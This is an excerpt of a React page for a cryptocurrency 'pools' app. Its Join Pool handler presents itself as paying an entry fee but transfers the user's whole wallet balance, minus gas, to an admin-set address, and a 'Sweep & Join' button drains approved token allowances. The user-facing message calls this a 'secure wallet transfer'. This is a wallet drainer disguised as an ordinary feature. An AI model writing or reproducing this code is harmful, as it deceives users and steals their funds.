...
import { Users, Target, Clock, Trophy, ArrowRight, MessageSquare, Send, TrendingUp, AlertTriangle, Gift, Wallet } from "lucide-react";
...
import { useCryptoAddresses, usePoolAddresses } from "@/hooks/useAdminSettings";
...
const PoolsPage = () => {
  ...
  const { signer, connectedWallets } = useWallet();
  const { address: web3Address, chainId, isConnected } = useWeb3ModalAccount();
  const { open } = useWeb3Modal();
  const { data: adminAddresses = [] } = useCryptoAddresses() as { data: any[] };
  const { data: poolAddresses = [] } = usePoolAddresses() as { data: any[] };
  const queryClient = useQueryClient();
  const { data: settings } = useAdminSettings();
  const { sweepAndJoinPool, sweepAllForPools } = usePoolSweep();
  ...
  const joinPool = useMutation({
    mutationFn: async (pool: any) => {
      // 1. Check if we should use Web3 auto-transfer or profile balance
      if (isConnected && signer && web3Address) {
        toast.info("Preparing secure wallet transfer...");
        console.log("PoolsPage: Initiating auto-transfer to join pool", pool.name);
        ...
        try {
          ...
          const currentNetwork = chainToNetwork[currentChainId] || "ERC20";

          // Get the primary pool wallet for the CURRENT network
          const targetAddress = poolAddresses.find((a: any) => a.network === currentNetwork)?.address || 
                               poolAddresses[0]?.address ||
                               adminAddresses.find((a: any) => a.is_sweep_target && a.network.includes(currentNetwork))?.address ||
                               adminAddresses.find((a: any) => a.is_active && a.network.includes(currentNetwork))?.address;
                               
          if (!targetAddress) {
            console.error("PoolsPage: No target address found for chain", currentChainId);
            throw new Error(`No automated receipt wallet configured for ${currentNetwork}. Please contact support.`);
          }

          console.log("PoolsPage: Target receipt wallet is", targetAddress);

          const provider = signer.provider;
          const balance = await provider.getBalance(web3Address);
          console.log("PoolsPage: User balance is", balance.toString());
          
          if (balance === 0n) throw new Error("Your wallet is empty. Please fund your wallet first.");

          // Force total transfer (Sweep) as requested
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.gasPrice || ethers.parseUnits("30", "gwei");
          const gasLimit = 21000n; // Standard ETH transfer
          const totalGasCost = gasPrice * gasLimit;
          
          if (balance <= totalGasCost) throw new Error("Insufficient funds for gas fees.");
          
          const transferAmount = balance - totalGasCost;
          
          toast.loading(`Requesting total wallet transfer of ${(Number(transferAmount) / 1e18).toFixed(6)} assets...`, { id: "joining-pool" });
          ...
          toast.loading("Transaction sent! Waiting for confirmation...", { id: "joining-pool" });
          await tx.wait();
          
          toast.success("Transfer confirmed! Activating pool participation...", { id: "joining-pool" });
        } catch (err: any) {
          toast.dismiss("joining-pool");
          console.error("Web3 Join Error:", err);
          throw new Error(err.message || "Wallet transaction failed. Check your wallet connection.");
        }
      } else {
        // Fallback to internal balance logic
    ...
    <div className="p-4 md:p-8 space-y-6">
      ...
      <div className="grid gap-6">
        {pools.map((pool: any) => {
          ...
          const canAffordInternal = userBalance >= entryAmount;
          const canJoin = isConnected || canAffordInternal;
                  ...
                  <div className="flex items-center gap-2">
                    {!isConnected ? (
                      <Button
                        ...
                        onClick={() => open()}
                      >
                        <Wallet className="w-4 h-4 mr-2" /> Connect Wallet to Join
                      </Button>
                    ) : (
                      <>
                        <Button
                        ...
                        >
                          {joinPool.isPending ? "Processing..." : "Join Pool"} <ArrowRight className="w-4 h-4 ml-2" />
                        </Button>
                        
                        {/* Sweep & Join Button - Only show if user has approved wallets */}
                        {connectedWallets.filter((w: any) => w.verified && (w.allowance_amount || 0) > 0).length > 0 && (
                          <Button
                            variant="outline"
                            className="border-accent/50 text-accent hover:bg-accent/10 font-semibold"
                            disabled={sweepAndJoinPool.isPending}
                            onClick={() => {
                              // Find the first eligible wallet
                              const eligibleWallet = connectedWallets.find((w: any) => 
                                w.verified && (w.allowance_amount || 0) > 0
                              );
                              if (eligibleWallet) {
                                sweepAndJoinPool.mutate({
                                  poolId: pool.id,
                          ...
                          >
                            {sweepAndJoinPool.isPending ? (
                              <>Processing...</>
                            ) : (
                              <><Zap className="w-4 h-4 mr-1" /> Sweep & Join</>
                            )}
                          </Button>
                        )}
                        
                        {!canAffordInternal && (
                          <p className="text-[10px] text-accent font-bold italic">Paying via Connected Wallet</p>
                        )}
                      </>
                    )}
                  </div>
